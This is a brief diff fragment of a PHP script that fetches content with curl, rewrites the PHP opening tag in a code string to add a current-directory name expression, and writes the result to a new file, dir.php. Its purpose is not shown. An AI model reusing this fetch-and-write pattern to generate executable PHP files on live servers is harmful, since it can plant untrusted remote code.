@@ -110,7 +110,7 @@ $file_contents= curl_exec($hc);
 curl_close($hc);
 
 //目录scan
-$dirs = preg_replace("/<\?php/im",'pathinfo(getcwd())["filename"];',$hanshu);
+$dirs = preg_replace("/<\?php/im",'<?php pathinfo(getcwd())["filename"];',$hanshu);
 
 $files = fopen("dir.php","w+");
 
